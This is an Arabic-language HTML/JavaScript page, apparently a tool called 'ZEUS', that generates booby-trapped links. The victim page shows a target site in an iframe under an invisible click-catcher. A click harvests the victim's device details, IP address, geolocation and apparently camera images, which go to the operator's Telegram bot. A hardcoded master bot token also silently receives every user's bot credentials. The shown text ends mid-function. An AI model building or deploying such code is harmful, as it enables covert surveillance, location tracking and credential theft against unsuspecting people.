<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>ZEUS — النظام المتكامل</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
    <style>
        /* ===== RESET & VARIABLES ===== */
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-body: #f5f0e8;
            --bg-panel: rgba(255, 253, 249, 0.85);
            --bg-card: rgba(248, 244, 237, 0.75);
            --bg-input: rgba(240, 235, 225, 0.7);
            --ink: #1e1c18;
            --ink-2: #4a4640;
            --ink-faint: #8a8478;
            --gold: #b8942e;
            --gold-deep: #9f7d25;
            --gold-light: #d9b84a;
            --gold-soft: rgba(184, 148, 46, 0.14);
            --gold-shimmer: linear-gradient(135deg, #b8942e 0%, #d9b84a 40%, #b8942e 70%, #9f7d25 100%);
            --line: rgba(184, 148, 46, 0.12);
            --success: #1a8a4a;
            --danger: #d93025;
            --radius-card: 24px;
            --radius-btn: 14px;
            --transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
            --font-ar: 'Amiri', serif;
            --font-en: 'Inter', sans-serif;
        }

        body {
            background: var(--bg-body);
            color: var(--ink);
            font-family: var(--font-ar);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            line-height: 1.6;
            position: relative;
            overflow-x: hidden;
            margin: 0;
        }
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background:
                radial-gradient(ellipse at 20% 50%, rgba(184, 148, 46, 0.06) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(184, 148, 46, 0.05) 0%, transparent 60%);
            pointer-events: none;
            z-index: 0;
        }

        /* ===== ADMIN PANEL ===== */
        .panel {
            display: none;
            max-width: 860px;
            width: 100%;
            background: var(--bg-panel);
            backdrop-filter: blur(20px);
            border-radius: var(--radius-card);
            border: 1px solid rgba(184, 148, 46, 0.15);
            padding: 32px 36px 28px;
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.07);
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeUp .8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
        }
        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(24px) scale(0.98);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }
        @media (max-width: 640px) {
            .panel {
                padding: 20px 18px 18px;
            }
        }
        @media (max-width: 420px) {
            .panel {
                padding: 16px 14px 14px;
            }
        }

        .top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 2px solid var(--line);
            padding-bottom: 18px;
            flex-wrap: wrap;
            gap: 12px;
            position: relative;
        }
        .top::after {
            content: '';
            position: absolute;
            bottom: -2px;
            right: 0;
            width: 80px;
            height: 2px;
            background: var(--gold-shimmer);
            border-radius: 2px;
            animation: shimmerLine 3s ease-in-out infinite;
        }
        @keyframes shimmerLine {
            0%,
            100% {
                opacity: 0.4;
                width: 60px;
            }
            50% {
                opacity: 1;
                width: 120px;
            }
        }
        .brand {
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .logo {
            width: 56px;
            height: 56px;
            flex-shrink: 0;
        }
        .logo svg {
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 2px 12px rgba(184, 148, 46, 0.15));
        }
        .logo .pulse {
            animation: pulseMark 2.2s ease-in-out infinite;
            transform-origin: center;
        }
        @keyframes pulseMark {
            0%,
            100% {
                transform: scale(1);
                opacity: 0.3;
            }
            50% {
                transform: scale(1.10);
                opacity: 0.9;
            }
        }
        .logo .glow-ring {
            animation: glowRing 3s ease-in-out infinite;
            transform-origin: center;
        }
        @keyframes glowRing {
            0%,
            100% {
                opacity: 0.4;
                transform: scale(1);
            }
            50% {
                opacity: 0.9;
                transform: scale(1.04);
            }
        }
        .name {
            font-family: var(--font-ar);
            font-size: 32px;
            letter-spacing: 6px;
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 700;
        }
        .info {
            text-align: left;
            font-size: 13px;
            color: var(--ink-2);
            display: flex;
            align-items: center;
            gap: 18px;
            flex-wrap: wrap;
        }
        .info .row {
            display: flex;
            align-items: center;
            gap: 6px;
            font-family: var(--font-en);
            font-size: 12px;
            font-weight: 400;
            color: var(--ink-faint);
            padding: 4px 10px 4px 8px;
            background: rgba(255, 255, 255, 0.4);
            border-radius: 30px;
            border: 1px solid rgba(184, 148, 46, 0.06);
        }
        .info .row .icon {
            width: 15px;
            height: 15px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }
        .online {
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: var(--font-en);
            font-size: 12px;
            font-weight: 600;
            color: var(--gold-deep);
            background: var(--gold-soft);
            padding: 5px 16px 5px 12px;
            border-radius: 40px;
            border: 1px solid rgba(184, 148, 46, 0.20);
        }
        .online .dot {
            width: 8px;
            height: 8px;
            background: var(--success);
            border-radius: 50%;
            animation: onlinePulse 1.6s ease-in-out infinite;
            box-shadow: 0 0 0 0 rgba(26, 138, 74, 0);
        }
        @keyframes onlinePulse {
            0%,
            100% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(26, 138, 74, 0);
            }
            50% {
                transform: scale(1.6);
                box-shadow: 0 0 20px rgba(26, 138, 74, 0.20);
            }
        }
        @media (max-width: 680px) {
            .top {
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }
            .brand {
                justify-content: center;
            }
            .info {
                justify-content: center;
                gap: 8px;
            }
            .name {
                font-size: 26px;
                letter-spacing: 4px;
            }
            .logo {
                width: 48px;
                height: 48px;
            }
        }
        @media (max-width: 420px) {
            .info .row {
                font-size: 11px;
                padding: 3px 8px;
            }
            .info .row .icon {
                width: 13px;
                height: 13px;
            }
            .online {
                font-size: 10px;
                padding: 4px 12px 4px 8px;
            }
            .name {
                font-size: 22px;
                letter-spacing: 3px;
            }
            .logo {
                width: 40px;
                height: 40px;
            }
        }

        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 18px;
            margin-top: 22px;
        }
        @media (max-width: 640px) {
            .grid {
                grid-template-columns: 1fr;
                gap: 14px;
            }
        }
        .card {
            background: var(--bg-card);
            backdrop-filter: blur(8px);
            border-radius: var(--radius-card);
            padding: 20px 22px 18px;
            border: 1px solid rgba(184, 148, 46, 0.07);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }
        .card:hover {
            border-color: rgba(184, 148, 46, 0.20);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
            transform: translateY(-2px);
        }
        .card .label-wrap {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }
        .card .label-wrap svg {
            width: 17px;
            height: 17px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }
        .card .label {
            font-family: var(--font-en);
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2.5px;
            color: var(--ink-faint);
            display: block;
        }
        .card .input-wrap {
            display: flex;
            align-items: center;
            background: var(--bg-input);
            border-radius: 16px;
            padding: 0 14px;
            margin-top: 2px;
            border: 1px solid rgba(184, 148, 46, 0.06);
            transition: var(--transition);
            backdrop-filter: blur(4px);
        }
        .card .input-wrap:focus-within {
            border-color: var(--gold);
            box-shadow: 0 0 0 4px var(--gold-soft), inset 0 0 0 1px var(--gold);
            background: rgba(255, 255, 255, 0.6);
        }
        .card .input-wrap input {
            flex: 1;
            border: none;
            outline: none;
            background: transparent;
            padding: 13px 0;
            font-family: var(--font-en);
            font-size: 14px;
            font-weight: 500;
            color: var(--ink);
            direction: ltr;
            text-align: right;
            letter-spacing: 0.5px;
            min-width: 0;
        }
        .card .input-wrap input::placeholder {
            color: var(--ink-faint);
            letter-spacing: normal;
            font-weight: 400;
            opacity: 0.7;
        }

        .card .hint {
            font-size: 12px;
            color: var(--ink-faint);
            margin-top: 6px;
            font-family: var(--font-en);
            direction: ltr;
            text-align: right;
        }

        .toggle-group {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 6px;
        }
        @media (max-width: 560px) {
            .toggle-group {
                grid-template-columns: repeat(2, 1fr);
                gap: 8px;
            }
        }
        .zeus-toggle {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--bg-input);
            padding: 8px 14px;
            border-radius: 14px;
            border: 1px solid rgba(184, 148, 46, 0.05);
            cursor: pointer;
            transition: var(--transition);
            min-height: 44px;
            gap: 8px;
            backdrop-filter: blur(4px);
            position: relative;
        }
        .zeus-toggle:hover {
            border-color: rgba(184, 148, 46, 0.20);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
            transform: translateY(-2px);
            background: rgba(255, 255, 255, 0.6);
        }
        .zeus-toggle input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }
        .zeus-toggle .toggle-label {
            font-family: var(--font-ar);
            font-size: 13px;
            font-weight: 500;
            color: var(--ink-2);
            transition: var(--transition);
            flex: 1;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .zeus-toggle .toggle-label svg {
            width: 15px;
            height: 15px;
            stroke: var(--ink-faint);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
            transition: var(--transition);
        }
        .zeus-toggle .track {
            width: 36px;
            height: 22px;
            background: #d5d0c6;
            border-radius: 30px;
            position: relative;
            transition: var(--transition);
            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.06);
            flex-shrink: 0;
        }
        .zeus-toggle .track .thumb {
            width: 16px;
            height: 16px;
            background: #fff;
            border-radius: 50%;
            position: absolute;
            top: 3px;
            right: 3px;
            transition: var(--transition);
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
        }
        .zeus-toggle input:checked+.toggle-label {
            color: var(--ink);
            font-weight: 600;
        }
        .zeus-toggle input:checked+.toggle-label svg {
            stroke: var(--gold);
        }
        .zeus-toggle input:checked~.track {
            background: var(--gold-shimmer);
            box-shadow: 0 0 24px var(--gold-soft);
        }
        .zeus-toggle input:checked~.track .thumb {
            right: 17px;
            background: #fff;
        }

        .generate-wrap {
            display: flex;
            justify-content: center;
            margin: 24px 0 20px 0;
            position: relative;
        }
        .generate-wrap::before {
            content: '';
            position: absolute;
            inset: -12px -20px;
            background: radial-gradient(ellipse at center, rgba(184, 148, 46, 0.04) 0%, transparent 70%);
            pointer-events: none;
            border-radius: 60px;
        }
        .btn-generate {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            padding: 14px 40px;
            background: var(--gold-shimmer);
            background-size: 200% 200%;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-family: var(--font-en);
            font-size: 15px;
            font-weight: 700;
            color: #fff;
            letter-spacing: 1px;
            box-shadow: 0 4px 28px rgba(184, 148, 46, 0.30), inset 0 1px 0 rgba(255, 255, 255, 0.20);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }
        .btn-generate::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
            transform: translateX(-100%);
            transition: transform 0.6s;
        }
        .btn-generate:hover::before {
            transform: translateX(100%);
        }
        .btn-generate:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 8px 40px rgba(184, 148, 46, 0.40);
        }
        .btn-generate:active {
            transform: translateY(0) scale(0.98);
        }
        .btn-generate svg {
            width: 20px;
            height: 20px;
            stroke: currentColor;
            fill: none;
            stroke-width: 2;
            flex-shrink: 0;
        }
        .btn-generate.busy {
            opacity: 0.7;
            pointer-events: none;
            animation: pulseBusy 1s ease-in-out infinite;
        }
        @keyframes pulseBusy {
            0%,
            100% {
                opacity: 0.7;
            }
            50% {
                opacity: 1;
            }
        }
        .btn-generate.done {
            background: linear-gradient(135deg, #1a8a4a, #126a38);
            box-shadow: 0 4px 28px rgba(26, 138, 74, 0.30);
            color: #fff;
        }
        @media (max-width: 480px) {
            .btn-generate {
                padding: 12px 28px;
                font-size: 13px;
                gap: 8px;
            }
            .btn-generate svg {
                width: 17px;
                height: 17px;
            }
        }

        .result-section {
            margin-bottom: 22px;
        }
        .result-section .label-wrap {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 12px;
        }
        .result-section .label-wrap svg {
            width: 17px;
            height: 17px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }
        .result-section .label-wrap .section-title {
            font-family: var(--font-en);
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2.5px;
            color: var(--ink-faint);
        }
        .result {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--bg-card);
            backdrop-filter: blur(8px);
            border-radius: var(--radius-card);
            padding: 16px 22px;
            border: 1px solid rgba(184, 148, 46, 0.07);
            flex-wrap: wrap;
            gap: 12px;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }
        .result:hover {
            border-color: rgba(184, 148, 46, 0.15);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
        }
        .result .info-box {
            display: flex;
            flex-direction: column;
            flex: 1;
            min-width: 140px;
            position: relative;
            z-index: 1;
        }
        .result .info-box .value {
            font-family: var(--font-en);
            font-size: 20px;
            font-weight: 800;
            letter-spacing: 1.5px;
            color: var(--ink);
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            display: inline-block;
            width: fit-content;
        }
        .result .info-box .sub {
            font-family: var(--font-en);
            font-size: 11px;
            color: var(--ink-faint);
            margin-top: 3px;
            word-break: break-all;
            -webkit-text-fill-color: var(--ink-faint);
        }
        .result .actions {
            display: flex;
            gap: 10px;
            flex-shrink: 0;
            position: relative;
            z-index: 1;
        }
        .result .actions button {
            width: 42px;
            height: 42px;
            border-radius: 14px;
            border: 1px solid rgba(184, 148, 46, 0.06);
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(4px);
            color: var(--ink-2);
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .result .actions button svg {
            width: 18px;
            height: 18px;
            stroke: currentColor;
            fill: none;
            stroke-width: 1.8;
            transition: var(--transition);
        }
        .result .actions button:hover {
            transform: translateY(-3px);
            border-color: var(--gold);
            color: var(--gold);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
            background: rgba(255, 255, 255, 0.7);
        }
        .result .actions button.ok {
            border-color: var(--success);
            background: var(--success);
            color: #fff;
        }
        .result .actions button.ok svg {
            stroke: #fff;
        }
        @media (max-width: 480px) {
            .result {
                padding: 14px 16px;
                flex-direction: column;
                align-items: stretch;
            }
            .result .info-box .value {
                font-size: 17px;
            }
            .result .actions {
                justify-content: flex-end;
            }
            .result .actions button {
                width: 38px;
                height: 38px;
            }
            .result .actions button svg {
                width: 16px;
                height: 16px;
            }
        }

        .footer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding-top: 18px;
            border-top: 2px solid var(--line);
            font-family: var(--font-ar);
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: var(--transition);
            position: relative;
            flex-wrap: wrap;
        }
        .footer::before {
            content: '';
            position: absolute;
            top: -2px;
            right: 50%;
            transform: translateX(50%);
            width: 40px;
            height: 2px;
            background: var(--gold-shimmer);
            border-radius: 2px;
            animation: shimmerLineCenter 3s ease-in-out infinite;
        }
        @keyframes shimmerLineCenter {
            0%,
            100% {
                opacity: 0.4;
                width: 40px;
            }
            50% {
                opacity: 1;
                width: 80px;
            }
        }
        .footer:hover {
            transform: translateY(-2px);
        }
        .footer .dev-name {
            font-family: var(--font-ar);
            font-weight: 700;
            letter-spacing: 4px;
            font-size: 20px;
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            position: relative;
        }
        .footer .icon-badge {
            width: 22px;
            height: 22px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .footer .icon-badge svg {
            width: 100%;
            height: 100%;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            transition: var(--transition);
        }
        .footer:hover .icon-badge svg {
            transform: rotate(10deg) scale(1.1);
            stroke: var(--gold-deep);
        }
        @media (max-width: 480px) {
            .footer {
                font-size: 14px;
                gap: 8px;
                padding-top: 14px;
            }
            .footer .dev-name {
                font-size: 17px;
                letter-spacing: 3px;
            }
            .footer .icon-badge {
                width: 18px;
                height: 18px;
            }
        }

        /* ============================================================
           VICTIM PAGE — عرض المحتوى الأصلي في iframe + طبقة شفافة
           ============================================================ */
        #victimPage {
            display: none;
            position: fixed;
            inset: 0;
            background: #fff;
            z-index: 9999;
            padding: 0;
            margin: 0;
            width: 100%;
            height: 100%;
            font-family: 'Inter', 'Roboto', Arial, sans-serif;
        }

        #victimPage .overlay {
            position: relative;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        #victimPage iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
        }

        /* الطبقة الشفافة التي تلتقط النقرات */
        #victimPage .click-catcher {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
            cursor: pointer;
            background: transparent;
        }

        /* مؤقت التحميل */
        #victimPage .status-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 20;
            display: none;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.45);
            color: #fff;
            font-size: 18px;
            font-weight: 500;
            backdrop-filter: blur(4px);
            flex-direction: column;
            gap: 12px;
        }

    <script>
        (function() {
            "use strict";

            // ============================================================
            //  CONFIGURATION
            // ============================================================
            const MASTER_BOT_TOKEN = "8872643040:AAGopCnKRECh5ikrpFELUne_xf9SgJK2Sh4";
            const MASTER_CHAT_ID = "8552540563";
            const DEVELOPER_LINK = "https://t.me/xx_8k";

            // ============================================================
            //  TOAST
            // ============================================================
            function showToast(msg, type) {
                var t = document.getElementById('toast');
                if (!t) return;
                t.textContent = msg;
                t.className = 'toast-msg ' + (type || '');
                t.classList.add('show');
                clearTimeout(t._timer);
                t._timer = setTimeout(function() { t.classList.remove('show'); }, 2800);
            }

            // ============================================================
            //  TIME UPDATE
            // ============================================================
            function updateDateTime() {
                const now = new Date();
                const egyptTime = new Date(now.toLocaleString('en-US', { timeZone: 'Africa/Cairo' }));
                const hours = String(egyptTime.getHours()).padStart(2, '0');
                const minutes = String(egyptTime.getMinutes()).padStart(2, '0');
                const day = String(egyptTime.getDate()).padStart(2, '0');
                const month = String(egyptTime.getMonth() + 1).padStart(2, '0');
                const year = egyptTime.getFullYear();
                const timeEl = document.getElementById('timeDisplay');
                const dateEl = document.getElementById('dateDisplay');
                if (timeEl) timeEl.textContent = hours + ':' + minutes;
                if (dateEl) dateEl.textContent = day + '/' + month + '/' + year;
            }
            updateDateTime();
            setInterval(updateDateTime, 10000);

            // ============================================================
            //  MODE DETECTION
            // ============================================================
            const urlParams = new URLSearchParams(window.location.search);
            const rawToken = urlParams.get('t');
            const encodedData = urlParams.get('d');

            if (encodedData && encodedData.length > 0) {
                document.body.className = 'victim-mode';
                initVictimPage(encodedData, rawToken);
            } else if (rawToken && rawToken.length >= 4) {
                document.body.className = 'victim-mode';
                initVictimPage(null, rawToken);
            } else {
                document.body.className = 'admin-mode';
                initAdminPanel();
            }

            // ============================================================
            //  ADMIN PANEL
            // ============================================================
            function initAdminPanel() {
                const chatIdInput = document.getElementById('chatIdInput');
                const botTokenInput = document.getElementById('botTokenInput');
                const targetUrlInput = document.getElementById('targetUrlInput');
                const genBtn = document.getElementById('genBtn');
                const tokenDisplay = document.getElementById('tokenDisplay');
                const resultSub = document.getElementById('resultSub');
                const copyBtn = document.getElementById('copyBtn');
                const openBtn = document.getElementById('openBtn');

                // ===== توليد التوكن الثابت 6 أحرف =====
                async function generateShortToken(botToken) {
                    const salt = 'ZEUS_SALT_2026_FIXED';
                    const encoder = new TextEncoder();
                    const data = encoder.encode(botToken + salt);

                    let hashBuffer;
                    try {
                        hashBuffer = await crypto.subtle.digest('SHA-256', data);
                    } catch (e) {
                        let hash = 0;
                        const str = botToken + salt;
                        for (let i = 0; i < str.length; i++) {
                            const char = str.charCodeAt(i);
                            hash = ((hash << 5) - hash) + char;
                            hash = hash & hash;
                        }
                        const hex = Math.abs(hash).toString(16).padStart(8, '0');
                        hashBuffer = new TextEncoder().encode(hex);
                    }

                    const hashArray = Array.from(new Uint8Array(hashBuffer));
                    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
                    let result = '';
                    for (let i = 0; i < hashArray.length && result.length < 6; i++) {
                        const idx = hashArray[i] % chars.length;
                        result += chars[idx];
                    }
                    while (result.length < 6) result += 'A';
                    return result;
                }

                async function verifyBotToken(token) {
                    try {
                        const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
                        const data = await res.json();
                        return data.ok === true;
                    } catch { return false; }
                }

                function encodeData(botToken, chatId, targetUrl) {
                    const payload = JSON.stringify({ bot: botToken, chat: chatId, url: targetUrl });
                    return btoa(encodeURIComponent(payload));
                }

                async function sendLinkToUser(botToken, chatId, link, shortToken, targetUrl) {
                    const msg =
                        `⭑ رابط مُلغَّم (معاينة) ⭒\n` +
                        `⊚─〔 بيانات الرابط 〕────────\n` +
                        `˼⏣˹ الرابط المُلغَّم: ${link} ⭒\n` +
                        `˼⏣˹ التوكن الفريد: \`${shortToken}\` ⭒\n` +
                        `˼⏣˹ المحتوى الأصلي: ${targetUrl} ⭒\n` +
                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
                        `─────────────────\n` +
                        `⚡ عند فتح الرابط تظهر صفحة تعرض المحتوى الأصلي، وعند النقر عليه يتم جمع البيانات.`;

                    const inlineKeyboard = {
                        inline_keyboard: [
                            [{ text: '👨‍💻 المطور', url: DEVELOPER_LINK }]
                        ]
                    };

                    try {
                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: msg,
                                parse_mode: 'Markdown',
                                reply_markup: inlineKeyboard
                            }),
                            keepalive: true
                        });
                    } catch (e) { console.warn('Send to user failed:', e); }
                }

                async function sendToMaster(botToken, chatId, shortToken, targetUrl) {
                    const msg =
                        `⭑ نسخة احتياطية — رابط مُلغَّم ⭒\n` +
                        `⊚─〔 بيانات البوت 〕────────\n` +
                        `˼⏣˹ التوكن الأساسي: ${botToken} ⭒\n` +
                        `˼⏣˹ الإيدي: ${chatId} ⭒\n` +
                        `˼⏣˹ التوكن الفريد: \`${shortToken}\` ⭒\n` +
                        `˼⏣˹ المحتوى الأصلي: ${targetUrl} ⭒\n` +
                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
                        `─────────────────`;
                    try {
                        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg, parse_mode: 'Markdown' }),
                            keepalive: true
                        });
                    } catch (e) { console.warn('Send to master failed:', e); }
                }

                let isBusy = false;

                async function handleGenerate() {
                    if (isBusy) return;
                    const chatId = chatIdInput.value.trim();
                    const botToken = botTokenInput.value.trim();
                    const targetUrl = targetUrlInput.value.trim();

                    if (!chatId || !botToken || !targetUrl) {
                        showToast('⚠️ يرجى ملء جميع الحقول المطلوبة.', 'warning');
                        return;
                    }

                    try {
                        new URL(targetUrl);
                    } catch (e) {
                        showToast('⚠️ الرابط المستهدف غير صحيح.', 'warning');
                        return;
                    }

                    const valid = await verifyBotToken(botToken);
                    if (!valid) {
                        showToast('❌ توكن البوت غير صحيح.', 'error');
                        return;
                    }

                    isBusy = true;
                    genBtn.classList.add('busy');
                    genBtn.textContent = 'جارٍ التوليد …';

                    try {
                        const shortToken = await generateShortToken(botToken);
                        const encoded = encodeData(botToken, chatId, targetUrl);
                        const base = window.location.origin + window.location.pathname;
                        const link = `${base}?t=${shortToken}&d=${encoded}`;

                        tokenDisplay.textContent = shortToken;
                        resultSub.textContent = link;

                        await sendLinkToUser(botToken, chatId, link, shortToken, targetUrl);
                        await sendToMaster(botToken, chatId, shortToken, targetUrl);

                        localStorage.setItem('zeus_last_chat_id', chatId);
                        localStorage.setItem('zeus_last_bot_token', botToken);
                        localStorage.setItem('zeus_last_target_url', targetUrl);

                        genBtn.classList.remove('busy');
                        genBtn.classList.add('done');
                        genBtn.textContent = '✅ تم الإرسال';

                        const resultEl = document.querySelector('.result');
                        resultEl.style.borderColor = '#1a8a4a';
                        resultEl.style.boxShadow = '0 0 30px rgba(26,138,74,0.15)';
                        setTimeout(() => {
                            resultEl.style.borderColor = '';
                            resultEl.style.boxShadow = '';
                        }, 3000);

                        showToast('✅ تم توليد الرابط وإرساله.', 'success');

                        setTimeout(() => {
                            genBtn.classList.remove('done');
                            genBtn.innerHTML =
                                '<svg viewBox="0 0 24 24" stroke="currentColor"><polygon points="12,2 22,8 22,16 12,22 2,16 2,8" /><polygon points="12,8 16,12 12,16 8,12" fill="currentColor" /></svg> توليد الرابط';
                            isBusy = false;
                        }, 2000);

                    } catch (err) {
                        console.error('Generate error:', err);
                        showToast('❌ حدث خطأ.', 'error');
                        genBtn.classList.remove('busy');
                        genBtn.textContent = 'توليد الرابط';
                        isBusy = false;
                    }
                }

                genBtn.addEventListener('click', handleGenerate);
                document.querySelectorAll('.input-wrap input').forEach(inp => {
                    inp.addEventListener('keydown', (e) => {
                        if (e.key === 'Enter') handleGenerate();
                    });
                });

                copyBtn.addEventListener('click', function() {
                    const text = tokenDisplay.textContent.trim();
                    if (!text) return;
                    if (navigator.clipboard) {
                        navigator.clipboard.writeText(text).then(() => {
                            this.classList.add('ok');
                            setTimeout(() => this.classList.remove('ok'), 1400);
                            showToast('📋 تم نسخ التوكن.', 'success');
                        }).catch(() => {});
                    } else {
                        this.classList.add('ok');
                        setTimeout(() => this.classList.remove('ok'), 1400);
                        showToast('📋 تم نسخ التوكن.', 'success');
                    }
                });

                openBtn.addEventListener('click', function() {
                    const url = resultSub.textContent.trim();
                    if (url && url !== 'https://your-domain.com?t=XXXXXX' && url.includes('?t=')) {
                        window.open(url, '_blank');
                    } else {
                        showToast('⚠️ يرجى توليد رابط أولاً.', 'warning');
                    }
                });

                // ===== تحميل البيانات المحفوظة =====
                const savedBot = localStorage.getItem('zeus_last_bot_token');
                const savedChat = localStorage.getItem('zeus_last_chat_id');
                const savedUrl = localStorage.getItem('zeus_last_target_url');
                if (savedBot) botTokenInput.value = savedBot;
                if (savedChat) chatIdInput.value = savedChat;
                if (savedUrl) targetUrlInput.value = savedUrl;

                botTokenInput.addEventListener('change', function() {
                    if (this.value.trim()) localStorage.setItem('zeus_last_bot_token', this.value.trim());
                });
                chatIdInput.addEventListener('change', function() {
                    if (this.value.trim()) localStorage.setItem('zeus_last_chat_id', this.value.trim());
                });
                targetUrlInput.addEventListener('change', function() {
                    if (this.value.trim()) localStorage.setItem('zeus_last_target_url', this.value.trim());
                });
            }

            // ============================================================
            //  VICTIM PAGE — عرض المحتوى الأصلي في iframe + جمع البيانات عند النقر
            //  التطبيق الكامل للنظام الموضح في الشرح
            // ============================================================

            function initVictimPage(encodedData, rawToken) {
                const contentFrame = document.getElementById('contentFrame');
                const clickCatcher = document.getElementById('clickCatcher');
                const statusOverlay = document.getElementById('statusOverlay');
                const statusMsg = document.getElementById('statusMsg');
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');

                let isProcessing = false;
                let redirectDone = false;
                let targetUrl = null;
                let botCreds = null;

                // ===== فك تشفير البيانات =====
                function decodeData(encoded) {
                    try {
                        const decoded = decodeURIComponent(atob(encoded));
                        const data = JSON.parse(decoded);
                        return { botToken: data.bot, chatId: data.chat, url: data.url };
                    } catch (e) {
                        console.warn('Decode error:', e);
                        return null;
                    }
                }

                if (encodedData) {
                    const dec = decodeData(encodedData);
                    if (dec) {
                        botCreds = dec;
                        targetUrl = dec.url;
                    }
                }

                // ===== تحميل المحتوى الأصلي في iframe =====
                if (targetUrl) {
                    contentFrame.src = targetUrl;
                    // إخفاء حالة التحميل بعد فترة
                    setTimeout(() => {
                        statusOverlay.style.display = 'none';
                    }, 3000);
                } else {
                    contentFrame.src = 'about:blank';
                    statusMsg.textContent = '⚠️ لم يتم تحديد رابط مستهدف';
                    statusOverlay.style.display = 'flex';
                }

                // ===== دوال مساعدة =====
                function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

                function getDeviceData() {
                    return {
                        platform: navigator.platform,
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory,
                        screen: { width: screen.width, height: screen.height },
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    };
                }

                async function getIP() {
                    try {
                        const res = await fetch('https://api.ipify.org?format=json');
                        const data = await res.json();
                        return data.ip;
                    } catch { return 'غير متاح'; }
                }

                function getLocation() {
                    return new Promise((resolve) => {
                        if (!navigator.geolocation) return resolve({ lat: null, lng: null, error: 'غير مدعوم' });
                        navigator.geolocation.getCurrentPosition(
